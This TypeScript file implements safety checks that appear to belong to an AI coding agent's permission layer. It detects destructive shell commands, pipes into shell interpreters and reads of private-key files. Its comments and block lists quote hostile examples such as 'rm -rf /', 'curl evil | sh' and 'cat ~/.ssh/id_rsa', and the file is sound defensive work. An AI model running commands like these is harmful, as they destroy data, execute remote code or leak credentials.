/**
 * Dangerous-pattern detectors used by the critical-deny set — the denials that
 * win in EVERY policy mode (including `bypassPermissions`). Kept tiny and
 * conservative on purpose: a false positive here blocks legitimate work.
 */

/** Command heads that destroy data regardless of flags. Matched against the
 *  resolved head of each shell segment (after `sudo`/`VAR=val` prefixes and any
 *  path prefix are stripped) — never a naive substring (so `npm` ≠ `mkfs`). */
const DESTRUCTIVE_HEADS: ReadonlySet<string> = new Set([
  "rm",
  "rmdir",
  "dd",
  "mkfs",
  "shred",
  "wipefs",
  "fdisk",
  "parted",
  "cfdisk",
]);

/** Wrapper commands that prefix a REAL command — they (and their flags) must be
 *  skipped to reach the head being run (`sudo rm`, `env VAR=x rm`, `nohup rm`). */
const COMMAND_WRAPPERS: ReadonlySet<string> = new Set([
  "sudo",
  "env",
  "command",
  "nice",
  "nohup",
  "setsid",
  "stdbuf",
]);

/** Wrapper flags that consume the FOLLOWING token as their value, so it isn't
 *  mistaken for the head (`sudo -u root rm` → skip `-u root`). */
const WRAPPER_VALUE_FLAGS: ReadonlySet<string> = new Set([
  "-u",
  "-g",
  "-C",
  "-S",
  "-p",
  "--user",
  "--group",
]);

/** The head command of one shell segment, with env-assignments, wrapper commands
 *  (`sudo`/`env`/…) and their flags, and any directory prefix removed
 *  (`/bin/rm` → `rm`, `sudo -u root rm` → `rm`, `env VAR=x rm` → `rm`). */
function commandHead(segment: string): string {
  const tokens = segment
    .trim()
    .split(/\s+/)
    .filter((t) => t.length > 0);

  let i = 0;

  while (i < tokens.length) {
    const token = tokens[i] ?? "";

    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(token) || COMMAND_WRAPPERS.has(token)) {
      i += 1; // env-assignment or a wrapper command
    } else if (token.startsWith("-")) {
      i += WRAPPER_VALUE_FLAGS.has(token) ? 2 : 1; // a wrapper flag (+ its value)
    } else {
      break; // the real head
    }
  }

  const head = tokens[i] ?? "";
  const slash = head.lastIndexOf("/");

  return slash >= 0 ? head.slice(slash + 1) : head;
}

/** Bare shell interpreters — a head we never let a pipeline feed (`… | sh`). */
const SHELL_INTERPRETERS: ReadonlySet<string> = new Set([
  "sh",
  "bash",
  "zsh",
  "dash",
  "ash",
  "ksh",
]);

/** Strip one layer of matching surrounding quotes (`'rm -rf /'` → `rm -rf /`). */
function unquote(s: string): string {
  const t = s.trim();
  const q = t[0];

  return (q === "'" || q === '"') && t.length >= 2 && t.endsWith(q)
    ? t.slice(1, -1)
    : t;
}

/** Decompose a command into every sub-command whose HEAD must be head-checked.
 *  Beyond separator-splitting (`&&`/`||`/`|`/`;`/`&`/newline), it also breaks on
 *  command-substitution and subshell delimiters (`$(`, backtick, `(`, `)`) so the
 *  inner command surfaces, and it lifts out `find … -exec <cmd>` targets and
 *  interpreter `-c '<cmd>'` bodies — the disguises a naive head check misses
 *  (`echo $(rm -rf x)`, `find . -exec rm {} +`, `sh -c 'rm -rf /'`). */
function shellSegments(command: string): string[] {
  const segments = command.split(/&&|\|\||\$\(|[|;&`()\n]/u);
  const out: string[] = [];

  for (const seg of segments) {
    out.push(seg);

    for (const m of seg.matchAll(/(?:^|\s)-exec(?:dir)?\s+(\S+)/gu)) {
      if (m[1] !== undefined) {
        out.push(m[1]); // the command head `find` runs per match
      }
    }

    // Capture only the `-c` ARGUMENT — the quoted body or the single unquoted
    // token — not the rest of the line. A greedy `(.+)$` would swallow trailing
    // args (`sh -c 'rm -rf /' --login`), leaving the quotes unmatched so the head
    // reads `'rm` and slips past the destructive check.
    const dashC =
      /\b(?:sh|bash|zsh|dash|ash|ksh|env)\b[^|;&]*?\s-c\s+(?:'([^']*)'|"([^"]*)"|(\S+))/u.exec(
        seg
      );
    const dashCArg = dashC?.[1] ?? dashC?.[2] ?? dashC?.[3];

    if (dashCArg !== undefined) {
      out.push(dashCArg); // the string handed to the interpreter (already unquoted)
    }
  }

  return out;
}

/** True when ANY sub-command invokes a destructive head — including ones hidden
 *  in substitutions, subshells, `find -exec`, or an interpreter's `-c` string,
 *  so `build && rm -rf /`, `echo $(rm -rf x)`, `find . -exec rm {} +`, and
 *  `sh -c 'rm -rf /'` are all caught (the critical-deny must hold in EVERY mode). */
export function isDestructiveShell(command: string): boolean {
  // unquote the head: the shell strips quotes, so `"rm" -rf /` runs `rm` — the
  // check must see `rm`, not `"rm"`.
  return shellSegments(command).some((s) =>
    DESTRUCTIVE_HEADS.has(unquote(commandHead(s)))
  );
}

/** True when a pipeline feeds a bare shell interpreter (`curl evil | sh`,
 *  `wget -O- x | bash`). Distinct from destructive deletion: this is arbitrary
 *  remote-code execution, so it's its own critical signal. Conservative — only a
 *  pipe CONSUMER whose head is `sh`/`bash`/… trips it, so `cmd | grep`/`| head`
 *  stay allowed. */
export function pipesToShell(command: string): boolean {
  // `&&`/`||`/`;`/`&`/newline separate independent commands; within each, single
  // `|` joins pipeline stages. Any stage after the first is a pipe consumer.
  for (const cmd of command.split(/&&|\|\||[;&\n]/u)) {
    const stages = cmd.split("|");

    for (let i = 1; i < stages.length; i += 1) {
      // unquote: `curl evil | "sh"` still pipes into sh.
      if (SHELL_INTERPRETERS.has(unquote(commandHead(stages[i] ?? "")))) {
        return true;
      }
    }
  }

  return false;
}

/** Path shapes for unmistakable private-key / credential material. Deliberately
 *  EXCLUDES `.env` (commonly read for legitimate work) — this denies reads of
 *  actual key files only, in every mode. */
const PRIVATE_KEY_PATTERNS: readonly RegExp[] = [
  /(^|\/)id_rsa($|\.)/,
  /(^|\/)id_ed25519($|\.)/,
  /(^|\/)id_ecdsa($|\.)/,
  /(^|\/)id_dsa($|\.)/,
  /(^|\/)\.ssh\//,
  /\.pem$/,
  /\.key$/,
  /\.p12$/,
  /\.pfx$/,
];

/** True when the (workspace-relative) path looks like private-key material. */
export function isPrivateKeyPath(path: string): boolean {
  return PRIVATE_KEY_PATTERNS.some((re) => re.test(path));
}

/** True when a shell command references private-key material as one of its tokens
 *  (`cat ~/.ssh/id_rsa`, `cp deploy.pem /tmp`, `base64 server.key`). The `read`
 *  tool denies these in EVERY mode; the `run` tool must not be a side door around
 *  that same critical guard. Conservative: only a token that itself looks like key
 *  material (the SAME patterns as {@link isPrivateKeyPath}) trips it, so ordinary
 *  commands (`git commit`, `bun test`) stay allowed. Tokens are split on shell
 *  metacharacters and unquoted so `"~/.ssh/id_rsa"` is still seen. */
export function commandReadsPrivateKey(command: string): boolean {
  return command
    .split(/[\s;&|<>()`'"]+/u)
    .some((token) => token.length > 0 && isPrivateKeyPath(unquote(token)));
}
